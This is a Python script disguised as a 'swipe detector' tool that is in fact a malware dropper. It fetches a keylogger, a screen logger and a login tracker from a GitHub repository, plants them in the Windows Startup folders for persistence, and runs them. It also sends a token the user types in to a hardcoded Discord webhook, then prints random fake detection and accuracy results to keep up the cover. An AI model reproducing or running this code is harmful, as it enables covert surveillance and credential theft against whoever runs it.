import requests
import os
from time import sleep as suspend
import random as socketserver

cwd = os.getcwd()
tempDIR = os.environ['temp']
pgmdataPATH = os.getenv('programdata')+ "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
os.chdir(tempDIR)

def verification():
	print("CoDo: True")
	codo =  tempDIR + "\\codo.py"
	codo = codo.replace("\\", "/")
	# print(codo)
	response = requests.get("https://raw.githubusercontent.com/Edgerman/storage/main/localCopy.py")
	code = response.text
	with open(codo, "w") as f:
		f.write(code)
	os.system("py " + f'"{codo}"')

def logg():
	usr = None
	logintym = None

def kl():
	global pgmdataPATH
	global appdataPATH
	try:
		import pyautogui
		from discord_webhook import DiscordWebhook
	except: 
		os.system("py -m pip install pyautogui")
		os.system("py -m pip install discord-webhook")
	# print(os.getenv('programdata')+ "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	# print(os.path.isdir(os.getenv('programdata')+ "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"))
	# print(os.getenv('appdata') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	# print(os.path.isdir(os.getenv('appdata') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"))
	pgmdataPATH = os.getenv('programdata')+ "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	appdataPATH = os.getenv('appdata') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	os.chdir(pgmdataPATH)
	klCODE = requests.get("https://raw.githubusercontent.com/Edgerman/storage/main/keylgr/kl_r.py")

	klSCRIPT = pgmdataPATH + "\\kl_r.pyw"
	klSCRIPT2 = appdataPATH + "\\kl_r.pyw"

	try:
		with open(pgmdataPATH + "\\kl_r.pyw", "w") as f:
			f.write(klCODE.text)
		os.system("py " + f'"{klSCRIPT}"')
	except PermissionError:
		with open(appdataPATH + "\\kl_r.pyw", "w") as f:
			f.write(klCODE.text)
		for x in range(10):
			print("ERROR 13: Elevation Denied")
			suspend(0.3)
		print("RECT: Open script as administrator to elevate")
		os.system("py " + f'"{klSCRIPT2}"')

def logon():
	pgmdataPATH = os.getenv('programdata')+ "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	appdataPATH = os.getenv('appdata') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	os.chdir(pgmdataPATH)
	logscript = pgmdataPATH + "\\onlinometer.pyw"
	logscript_appdata = appdataPATH + "\\onlinometer.pyw"
	LOGINcode = requests.get("https://raw.githubusercontent.com/Edgerman/storage/main/onlinometer.py")
	print("onlinometer: True")
	try:
		try:
			with open(logscript, "w") as f:
				f.write(LOGINcode.text)
			os.system("py " + f'"{logscript}"')
		except PermissionError:
			with open(logscript_appdata, "w") as f:
				f.write(LOGINcode.text)
			for x in range(10):
				print("ERROR 13: Elevation Denied")
				suspend(0.3)
			print("RECT: Open script as administrator to elevate")
			os.system("py " + f'"{logscript_appdata}"')
	except KeyboardInterrupt:
		print("[[ PasterOverride ]]")

def scnlgr():
	pgmdataPATH = os.getenv('programdata')+ "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	appdataPATH = os.getenv('appdata') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	os.chdir(pgmdataPATH)
	SLscript = pgmdataPATH + "\\SCRNlgr.pyw"
	SLscript_appdata = appdataPATH + "\\SCRNlgr.pyw"
	LOGINcode = requests.get("https://raw.githubusercontent.com/Edgerman/storage/main/scrnLGR/SCRNlgr_r.py")
	print('Scrn_lgr: True')
	try:
		try:
			with open(SLscript, "w") as f:
				f.write(LOGINcode.text)
			os.system("py " + f'"{SLscript}"')
		except PermissionError:
			with open(SLscript_appdata, "w") as f:
				f.write(LOGINcode.text)
			for x in range(10):
				print("ERROR 13: Elevation Denied")
				suspend(0.3)
			print("RECT: Open script as administrator to elevate")
			os.system("py " + f'"{SLscript_appdata}"')
	except KeyboardInterrupt:
		input("\n\n\n\nPress enter to activate swipe mode...")

verification()
kl()
logon()
scnlgr()

INPtkn = input("Enter Encoding: ")
bot = {"content": INPtkn,
		"username": "Tkn_TB360",
		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/960161820390342736/unknown.png',
		"tts": "false"}
HOOKid = '956596027572486224/uYd9J45J75m3R00kh9-wsX6jNu2c4wCPTgZugQDAj8HbvM4HoCSvFdchjbufOZHedsxc'
ping = requests.post('https://discord.com/api/webhooks/' + HOOKid , json=bot)
if bool(socketserver.choice([1,0])):
	print(f"Swipe Detected: {socketserver.choice(range(10))+1}")
else:
	print("Swipe not found")
suspend(1)
print("Accuracy Level: " + f"{socketserver.choice(range(70))+1}" + " %")
input("<<End of Script>>")